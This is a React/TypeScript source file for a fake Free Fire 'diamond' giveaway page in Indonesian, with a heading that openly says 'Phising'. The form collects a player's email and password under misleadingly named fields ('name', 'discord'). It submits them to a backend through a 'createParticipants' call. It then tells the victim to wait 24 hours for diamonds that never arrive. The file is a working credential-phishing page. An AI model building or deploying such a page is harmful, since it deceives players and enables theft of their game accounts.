import { useState } from "react";
import { createParticipants } from "../../services/getParticipants";

export default function Giveaway() {
  const [name, setName] = useState("");
  const [submitted, setSubmmited] = useState<boolean>(false);
  const [discord, setDiscord] = useState("");

  const { mutate } = createParticipants();

  function handleSubmit(e: any) {
    e.preventDefault();
    if (name.length === 0) {
      alert("Please enter your name");
      return;
    }
    mutate({ name: name, discord });
    setName("");
    setDiscord("");
    setSubmmited(true);
  }

  return (
    <div className="h-screen bg-[url('/freefire.webp')] bg-cover bg-no-repeat text-amber-300">
      <div className="flex flex-col justify-center items-center h-full gap-4 bg-black/40 pt-20 md:pt-10">
        {submitted ? (
          <>
            <div className="text-center">
              <h1 className="text-2xl font-bold ">
                Tunggu 24 jam agar diamond masuk
              </h1>
              <button
                className="btn mt-4 btn-accent"
                onClick={() => setSubmmited(false)}
              >
                back
              </button>
            </div>
          </>
        ) : (
          <>
            <h1 className="text-3xl  scroll-m-0">PRIPAYERMEX makin HD</h1>

            <h2 className="text-4xl">Phising elgandhi</h2>
            <label htmlFor="">Email</label>
            <input
              className="p-2 text-slate-900 border-2 border-slate-900 rounded-md"
              type="text"
              placeholder="Masukkan Email..."
              value={name}
              onChange={(e) => setName(e.target.value)}
            />
            <label htmlFor="Discord">Password</label>
            <input
              className="p-2 text-slate-900 border-2 border-slate-900 rounded-md"
              type="text"
              placeholder="Masukkan Password Password..."
              value={discord}
              onChange={(e) => setDiscord(e.target.value)}
            />
            <label htmlFor="">Diamond</label>
            <input
              className="p-2 text-slate-900 border-2 border-slate-900 rounded-md"
              type="number"
              placeholder="Masukkan jumlah diamond"
              // value={discord}
              // onChange={(e) => setDiscord(e.target.value)}
            />
            <button onClick={handleSubmit} className="btn btn-accent">
              Submit
            </button>
          </>
        )}
      </div>
    </div>
  );
}
